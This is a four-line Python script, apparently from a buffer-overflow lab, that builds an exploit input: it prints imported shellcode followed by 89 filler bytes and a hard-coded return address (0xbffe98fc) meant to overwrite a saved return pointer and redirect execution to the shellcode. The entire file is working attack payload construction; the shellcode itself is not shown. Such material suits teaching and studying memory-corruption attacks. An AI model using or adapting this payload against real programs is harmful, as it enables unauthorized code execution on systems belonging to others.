from shellcode import shellcode

s = "\x11" * 89 + "\xfc\x98\xfe\xbf"
print(shellcode+s)

